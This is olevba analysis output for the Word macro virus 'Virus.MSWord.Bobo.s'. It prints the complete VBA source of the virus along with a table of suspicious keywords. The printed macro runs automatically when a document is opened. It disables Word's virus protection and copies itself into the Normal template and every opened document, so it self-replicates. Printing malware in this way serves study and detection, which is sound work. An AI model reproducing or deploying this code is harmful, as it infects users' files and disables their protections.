olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bobo.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bobo.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Bobo.s - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim t As Boolean
Dim s As String
Dim ss As String

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro creada el 09/04/96 por osvald"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
    On Error Resume Next
    Options.VirusProtection = False
    If NormalTemplate.VBProject.Protection = False And ActiveDocument.VBProject.Protection = False Then
      Call Tsym_The_Chose_One
    End If
End Sub

Sub Tsym_The_Chose_One()
  t = False
  s = ActiveDocument.Path + "\" + ActiveDocument.Name
  ss = NormalTemplate.Path + "\" + NormalTemplate.Name
    Call The_Mystticallis_Kundalinni
End Sub
  
Sub The_Mystticallis_Kundalinni()
  For Each mhac In NormalTemplate.VBProject.vbcomponents
    If mhac.Name = "Modulo1" Then t = True
  Next mhac

  If t = False Then
     Application.OrganizerCopy Source:=s, Destination _
     :=ss, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
     If Err.Number <> 0 Then
       Exit Sub
     End If
     NormalTemplate.Save
     If Err.Number <> 0 Then
       Exit Sub
     End If
  End If
  t = False
      For Each mhac In ActiveDocument.VBProject.vbcomponents
         If mhac.Name = "Modulo1" Then t = True
      Next mhac
      If t = False Then
         Application.OrganizerCopy Source:=ss, Destination _
         :=s, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
         If Err.Number <> 0 Then
      Exit Sub
     End If
     ActiveDocument.Save
     If Err.Number <> 0 Then
       Exit Sub
      End If
   End If
End

 MsgBox "Você: O que é isso vestindo preto na minha frente ?"
 MsgBox "Você: Parece o MEDO a DOR o MAL em pessoal, quem é você?"
 MsgBox "Myst: Eu sou o escolhido, agora vire-se e corra."
 MsgBox "Myst: Todos os destinos estão selados, e a sua vida agora acaba!"
 MsgBox "Você: Antes de correr preciso saber seu nome..."
 MsgBox "Myst: Meu nome é Myst, segure minhas mãos e sinta."
 MsgBox "Você: É como as labaredas de fogo que nascem no Inferno e tocam Céu"
 MsgBox "Myst: Eu fui ESCOLHIDO e você agora também é..."

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

